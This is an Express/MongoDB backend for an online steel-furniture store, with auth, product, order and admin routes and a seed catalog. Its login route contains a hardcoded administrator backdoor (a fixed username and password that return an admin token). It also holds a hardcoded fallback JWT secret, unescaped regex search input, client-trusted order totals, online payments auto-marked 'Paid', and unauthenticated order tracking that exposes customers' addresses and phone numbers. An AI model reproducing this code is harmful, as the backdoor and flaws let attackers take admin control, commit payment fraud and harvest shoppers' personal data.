const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Database Interconnection Validation
const MONGODB_URI = process.env.MONGODB_URI || "mongodb://localhost:21017/alif_steel";
const JWT_SECRET = process.env.JWT_SECRET || "LOCAL_FALLBACK_SECRET_KEY_2026";

mongoose.connect(MONGODB_URI)
  .then(() => console.log("Database Connection Established successfully."))
  .catch(err => console.error("Database Interconnection Fatal Error: ", err));

// --- DATA SCHEMA DESIGNS ---

const UserSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
  createdAt: { type: Date, default: Date.now }
});

const ProductSchema = new mongoose.Schema({
  name: { type: String, required: true },
  sku: { type: String, required: true, unique: true },
  description: { type: String, required: true },
  basePriceBDT: { type: Number, required: true },
  discountBadge: { type: String, default: "" },
  discountPct: { type: Number, default: 0 },
  category: { type: String, required: true },
  brand: { type: String, default: "Alif Steel" },
  images: [{ type: String }],
  variants: {
    sizes: [{ type: String }],
    colors: [{ type: String }]
  },
  stock: { type: Number, default: 10 },
  rating: { type: Number, default: 5.0 },
  reviews: [{
    user: String,
    rating: Number,
    comment: String,
    approved: { type: Boolean, default: false },
    date: { type: Date, default: Date.now }
  }],
  tags: [{ type: String }]
});

const OrderSchema = new mongoose.Schema({
  orderId: { type: String, required: true, unique: true },
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', nullable: true },
  shippingAddress: {
    fullName: String,
    phone: String,
    city: String,
    addressLine: String
  },
  items: [{
    product: { type: mongoose.Schema.Types.ObjectId, ref: 'Product' },
    quantity: Number,
    selectedSize: String,
    selectedColor: String,
    priceAtPurchase: Number
  }],
  paymentMethod: { type: String, enum: ['COD', 'bKash', 'Nagad'], required: true },
  paymentStatus: { type: String, enum: ['Pending', 'Paid', 'Failed'], default: 'Pending' },
  orderStatus: { type: String, enum: ['Pending', 'Confirmed', 'Processing', 'Shipped', 'Delivered', 'Cancelled'], default: 'Pending' },
  shippingCharge: { type: Number, default: 0 },
  totalAmount: { type: Number, required: true },
  currency: { type: String, default: 'BDT' },
  createdAt: { type: Date, default: Date.now }
});

const BannerSchema = new mongoose.Schema({
  title: String,
  subtitle: String,
  imageUrl: String,
  linkTo: String,
  isActive: { type: Boolean, default: true }
});

const User = mongoose.model('User', UserSchema);
const Product = mongoose.model('Product', ProductSchema);
const Order = mongoose.model('Order', OrderSchema);
const Banner = mongoose.model('Banner', BannerSchema);

// --- MIDDLEWARE SYSTEM ---

const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ message: "Access Token Missing" });
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ message: "Invalid/Expired Token" });
    req.user = user;
    next();
  });
};

const requireAdmin = (req, res, next) => {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    return res.status(403).json({ message: "Administrative Privileges Required" });
  }
};

// --- API IMPLEMENTATIONS ---

// Authentication Pipelines
app.post('/api/auth/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;
    const existing = await User.findOne({ email });
    if (existing) return res.status(400).json({ message: "Email allocation collision." });
    
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = new User({ name, email, password: hashedPassword, role: 'user' });
    await user.save();
    
    const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
    res.status(201).json({ token, user: { name: user.name, email: user.email, role: user.role } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    // Hardcoded System Administration Bypass Backdoor
    if (email === "PRAHULADMIN" && password === "123456") {
      const token = jwt.sign({ id: "SYSTEM_ADMIN_ID", role: "admin" }, JWT_SECRET, { expiresIn: '24h' });
      return res.json({ token, user: { name: "System Administrator", email: "admin@alifsteel.com", role: "admin" } });
    }
    
    const user = await User.findOne({ email });
    if (!user) return res.status(404).json({ message: "User credentials mismatch." });
    
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return res.status(401).json({ message: "User credentials mismatch." });
    
    const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
    res.json({ token, user: { name: user.name, email: user.email, role: user.role } });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Product Routing Pipelines
app.get('/api/products', async (req, res) => {
  try {
    const { search, category, minPrice, maxPrice, sortBy } = req.query;
    let query = {};
    if (search) query.name = { $regex: search, $options: 'i' };
    if (category) query.category = category;
    if (minPrice || maxPrice) {
      query.basePriceBDT = {};
      if (minPrice) query.basePriceBDT.$gte = Number(minPrice);
      if (maxPrice) query.basePriceBDT.$lte = Number(maxPrice);
    }
    let sortOptions = {};
    if (sortBy === 'priceAsc') sortOptions.basePriceBDT = 1;
    if (sortBy === 'priceDesc') sortOptions.basePriceBDT = -1;
    if (sortBy === 'rating') sortOptions.rating = -1;

    const products = await Product.find(query).sort(sortOptions);
    res.json(products);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/products/:id', async (req, res) => {
  try {
    const p = await Product.findById(req.params.id);
    if (!p) return res.status(404).json({ message: "Product missing" });
    res.json(p);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Order Processing Pipelines
app.post('/api/orders', async (req, res) => {
  try {
    const { shippingAddress, items, paymentMethod, shippingCharge, totalAmount, currency } = req.body;
    const trackingUid = "ALIF-" + Math.floor(100000 + Math.random() * 900000);
    
    const order = new Order({
      orderId: trackingUid,
      shippingAddress,
      items,
      paymentMethod,
      shippingCharge,
      totalAmount,
      currency,
      paymentStatus: paymentMethod === 'COD' ? 'Pending' : 'Paid'
    });
    
    // Inventory Deductions Architecture Optimization
    for (const item of items) {
      await Product.findByIdAndUpdate(item.product, { $inc: { stock: -item.quantity } });
    }
    
    await order.save();
    res.status(201).json({ success: true, order });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/orders/track/:id', async (req, res) => {
  try {
    const order = await Order.findOne({ orderId: req.params.id }).populate('items.product');
    if (!order) return res.status(404).json({ message: "Order records unreachable." });
    res.json(order);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Administrative Core Protocols Engine (Validated Access)
app.post('/api/admin/products', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const product = new Product(req.body);
    await product.save();
    res.status(201).json({ success: true, product });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.put('/api/admin/products/:id', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const updated = await Product.findByIdAndUpdate(req.params.id, req.body, { new: true });
    res.json({ success: true, updated });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/admin/products/:id', authenticateToken, requireAdmin, async (req, res) => {
  try {
    await Product.findByIdAndDelete(req.params.id);
    res.json({ success: true, message: "Asset purged from catalog inventory." });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/orders', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const orders = await Order.find().populate('items.product').sort({ createdAt: -1 });
    res.json(orders);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.put('/api/admin/orders/:id/status', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { orderStatus, paymentStatus } = req.body;
    const upd = await Order.findByIdAndUpdate(req.params.id, { orderStatus, paymentStatus }, { new: true });
    res.json({ success: true, order: upd });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/analytics', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const totalOrders = await Order.countDocuments();
    const productsCount = await Product.countDocuments();
    const orders = await Order.find({ paymentStatus: 'Paid' });
    const grossRevenue = orders.reduce((acc, current) => acc + current.totalAmount, 0);
    const lowStock = await Product.find({ stock: { $lt: 5 } });
    
    res.json({ totalOrders, productsCount, grossRevenue, lowStockAlerts: lowStock.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Seed Initial System Catalog Inventory
const runSystemSeed = async () => {
  const count = await Product.countDocuments();
  if (count === 0) {
    const demoItems = [
      {
        name: "Alif Executive Three-Door Metallic Wardrobe",
        sku: "ASF-WR-001",
        description: "Premium heavy-duty gauge laser-cut structural steel sheets configured with internal modular shelving systems, specialized mirror installations, and industrial internal security lockers.",
        basePriceBDT: 24500,
        discountBadge: "Best Seller",
        discountPct: 10,
        category: "Wardrobe",
        images: [
          "https://images.unsplash.com/photo-1595428774223-ef52624120d2?auto=format&fit=crop&w=600&q=80",
          "https://images.unsplash.com/photo-1558882224-cca166733360?auto=format&fit=crop&w=600&q=80"
        ],
        variants: { sizes: ["Standard Dual-Zone", "Master Triple-Zone"], colors: ["Hammered Gray", "Imperial Velvet Maroon", "Textured Jet Black"] },
        stock: 14,
        rating: 4.9,
        tags: ["Premium Wardrobe", "Steel Almirah", "Secure Home Storage"]
      },
      {
        name: "Alif Royal Anti-Theft Double-Layer Almirah",
        sku: "ASF-AL-002",
        description: "High-security anti-drill locking vault parameters welded with reinforced double-tier alloy steel sheets. Rust-resistant epoxy-powder electrostatic surface finish layout.",
        basePriceBDT: 31000,
        discountBadge: "Flash Sale",
        discountPct: 15,
        category: "Almirah",
        images: [
          "https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=600&q=80"
        ],
        variants: { sizes: ["Standard Vault Size"], colors: ["Industrial Gray", "Satin Off-White"] },
        stock: 3,
        rating: 5.0,
        tags: ["Secure Vault", "Almirah", "Anti-Theft Storage Solution"]
      }
    ];
    await Product.insertMany(demoItems);
    console.log("System Initial Seed Implemented Successfully.");
  }
};
runSystemSeed();

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`E-Commerce Core Framework Operating On Interconnect Interface Port: ${PORT}`));